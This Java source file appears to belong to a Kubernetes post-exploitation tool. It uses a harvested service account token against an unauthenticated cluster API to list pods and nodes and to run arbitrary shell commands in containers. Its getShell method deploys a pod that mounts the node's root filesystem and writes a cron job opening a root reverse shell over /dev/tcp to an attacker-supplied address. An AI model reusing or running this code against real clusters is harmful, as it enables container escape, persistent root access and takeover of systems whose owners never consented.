package post;

import JOBO.CurrentHost;
import io.fabric8.kubernetes.api.model.*;
import io.fabric8.kubernetes.client.Config;
import io.fabric8.kubernetes.client.ConfigBuilder;
import io.fabric8.kubernetes.client.KubernetesClient;
import io.fabric8.kubernetes.client.KubernetesClientBuilder;
import io.fabric8.kubernetes.client.dsl.ExecListener;
import io.fabric8.kubernetes.client.dsl.ExecWatch;

import java.io.ByteArrayOutputStream;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;

public class KubeApiOption {

    public static boolean getPodinfo(CurrentHost currentHost,String token){
        if (currentHost.isKubeletAPIUnauth()){
            if (token.isEmpty()){
                token = currentHost.getSAToken();
            }
            if (token.isEmpty()){
                System.out.println("Invalid parameters");
                return false;
            }
            Config config = new ConfigBuilder()
                    .withMasterUrl(currentHost.getK8SAPIIP())
                    .withAutoOAuthToken(token)
                    .build();
            KubernetesClient client = new KubernetesClientBuilder().withConfig(config).build();
            List<Pod> items = client.pods().list().getItems();
            System.out.println("namespace\tpodName\tcontainerName\tpodIP\tnodeName\tstatus");
            for (Pod pod : items) {
                List<Container> containers = pod.getSpec().getContainers();
                if (containers.size()>1){
                    for (Container container:containers){
                        System.out.println(pod.getMetadata().getNamespace()+"\t"+pod.getMetadata().getName()+"\t"+container.getName()+"\t"+pod.getStatus().getPodIP()+"\t"+pod.getSpec().getNodeName()+"\n"+pod.getStatus().getPhase());
                    }
                }
                System.out.println(pod.getMetadata().getNamespace()+"\t"+pod.getMetadata().getName()+"\t"+pod.getSpec().getContainers().get(0)+"\t"+pod.getStatus().getPodIP()+"\t"+pod.getStatus().getPhase());
            }
            client.close();
            return true;
        }
        return false;
    }

    public static boolean execCmd(CurrentHost currentHost,String token,String namespace,String podName,String containerName,String cmd){
        if (currentHost.isKubeletAPIUnauth()){
            if (token.isEmpty()){
                token = currentHost.getSAToken();
            }
            if (namespace.isEmpty() || podName.isEmpty() || containerName.isEmpty() || cmd.isEmpty()){
                System.out.println("Invalid parameters");
                return false;
            }
            Config config = new ConfigBuilder()
                    .withMasterUrl(currentHost.getK8SAPIIP())
                    .withAutoOAuthToken(token)
                    .build();
            KubernetesClient client = new KubernetesClientBuilder().withConfig(config).build();
            ByteArrayOutputStream stdout = new ByteArrayOutputStream();
            ByteArrayOutputStream stderr = new ByteArrayOutputStream();
            CompletableFuture<Integer> exitCodeFuture = new CompletableFuture<>();
            String[] cmds = new String[]{"sh","-c",cmd};
            try (ExecWatch execWatch = client.pods()
                    .inNamespace(namespace)
                    .withName(podName)
                    .inContainer(containerName)
                    .writingOutput(stdout)
                    .writingError(stderr)
                    .usingListener(new ExecListener() {
                        @Override
                        public void onFailure(Throwable t, Response response) {
                            exitCodeFuture.completeExceptionally(t);
                        }

                        @Override
                        public void onClose(int code, String reason) {
                            exitCodeFuture.complete(code);
                        }
                    })
                    .exec(cmds)) {
                int exitCode = exitCodeFuture.get(30, TimeUnit.SECONDS);
                System.out.println(exitCode);
                System.out.println(stdout.toString());
                System.out.println(stderr.toString());
                return true;
            } catch (Exception e) {
                System.out.println(e.getMessage());
                return false;
            }finally {
                client.close();
            }
        }
        return false;
    }

    public static boolean getNodeInfo(CurrentHost currentHost,String token){
        if (currentHost.isKubeletAPIUnauth()){
            if (token.isEmpty()){
                token = currentHost.getSAToken();
            }
            Config config = new ConfigBuilder()
                    .withMasterUrl(currentHost.getK8SAPIIP())
                    .withAutoOAuthToken(token)
                    .build();
            KubernetesClient client = new KubernetesClientBuilder().withConfig(config).build();

            try {
                List<Node> items = client.nodes().list().getItems();
                System.out.println("nodeName\tnodeLabel\tnodeIP\ttime\tstatus");
                for (Node node : items) {

                    System.out.println(node.getMetadata().getName()+"\t"+node.getMetadata().getLabels()+"\t"+node.getStatus().getAddresses().get(0)+"\t"+node.getMetadata().getCreationTimestamp()+"\t"+node.getStatus().getPhase());
                }
                return true;
            }catch (Exception e){
                System.out.println(e.getMessage());
                return false;
            }finally {
                client.close();
            }
        }
        return false;
    }

    public static boolean getShell(CurrentHost currentHost,String token,String shellip,String nodeName){
        if (currentHost.isKubeletAPIUnauth()){
            if (token.isEmpty()){
                token = currentHost.getSAToken();
            }
            shellip = shellip.replaceAll(":","/");
            Config config = new ConfigBuilder()
                    .withMasterUrl(currentHost.getK8SAPIIP())
                    .withAutoOAuthToken(token)
                    .build();
            KubernetesClient client = new KubernetesClientBuilder().withConfig(config).build();
            try {
                Pod pod = new PodBuilder().withKind("pod").withNewMetadata().withName("test-pod").endMetadata().withNewSpec().addNewContainer().withName("nginx").withImage("nginx:1.14.2").withCommand("sh", "-c").withArgs("echo '* * * * * root  bash -c \"bash -i >& /dev/tcp/" + shellip + " 0>&1\"' >> /host/etc/crontab").addNewVolumeMount().withName("volume").withMountPath("/host").endVolumeMount().endContainer().addNewVolume().withName("volume").withHostPath(new HostPathVolumeSourceBuilder().withPath("/").withType("Directory").build()).endVolume().withNodeName(nodeName).withRestartPolicy("Never").endSpec().build();
                pod = client.pods()
                        .inNamespace("default")
                        .resource(pod)
                        .create();
                return true;
            }catch (Exception e){
                return false;
            }finally {
                client.close();
            }
        }
        return false;
    }
}
